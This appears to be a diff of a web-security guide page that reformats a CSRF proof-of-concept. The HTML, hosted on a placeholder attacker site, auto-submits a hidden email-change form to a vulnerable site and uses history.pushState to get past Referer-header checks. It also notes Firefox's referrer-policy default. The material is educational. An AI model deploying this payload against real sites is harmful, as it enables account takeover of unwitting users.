@@ -151,21 +151,22 @@ redirectOnConfirmation = () => {
 {% hint style="success" %}
 **Tip**: Instead of use `http://attacker-website.com/vulnerable-website.com`, you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/vulnerable-website.com')</script>`
 
-<pre class="language-html"><code class="lang-html">&#x3C;!-- http://attacker-website.com/ -->
-<strong>&#x3C;html>
-</strong>  &#x3C;meta name="referrer" content="unsafe-url"/>
-  &#x3C;body>
-    &#x3C;form action="https://vulnerable-website.com/change-email" method="POST">
-      &#x3C;input type="hidden" name="email" value="test@test.com" />
-      &#x3C;input type="submit" value="Submit request" />
-    &#x3C;/form>
-    &#x3C;script>
+```html
+<!-- http://attacker-website.com/ -->
+<html>
+  <meta name="referrer" content="unsafe-url"/>
+  <body>
+    <form action="https://vulnerable-website.com/change-email" method="POST">
+      <input type="hidden" name="email" value="test@test.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
       history.pushState('', '', '/vulnerable-website.com');
       document.forms[0].submit();
-    &#x3C;/script>
-  &#x3C;/body>
-&#x3C;/html>
-</code></pre>
+    </script>
+  </body>
+</html>
+```
 {% endhint %}
 
 Firefox 87 new default Referrer Policy `strict-origin-when-cross-origin` trimming user sensitive information like path and query string to protect privacy. \[[🔗](https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/)]
